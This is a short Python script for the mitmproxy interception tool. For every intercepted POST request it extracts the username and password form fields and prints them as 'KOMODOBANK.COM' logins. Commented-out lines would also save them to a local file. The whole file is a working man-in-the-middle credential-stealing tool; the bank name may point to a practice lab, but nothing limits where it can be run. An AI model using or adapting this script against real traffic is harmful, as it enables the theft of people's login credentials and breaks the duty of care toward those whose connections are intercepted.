from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless


def request(context, flow):
    	# Test for post-request
	if flow.request.method == "POST":
		post_form = flow.request.get_form_urlencoded()
		print "\n\n", 100 * "-", "\n\nPOST REQUEST FOUND!!!"
		print "KOMODOBANK.COM -- USERNAME: {} \t -- PASSWORD: {}".format( post_form['username'], post_form['password'] )
		print 100 * "-", "\n\n"
		#f = open("~/komodo-logins.txt","w+")
		#f.write( "KOMODOBANK.COM -- USERNAME: {} \t -- PASSWORD: {}".format( post_form['username'], post_form['password'] ) )
		#f.close()
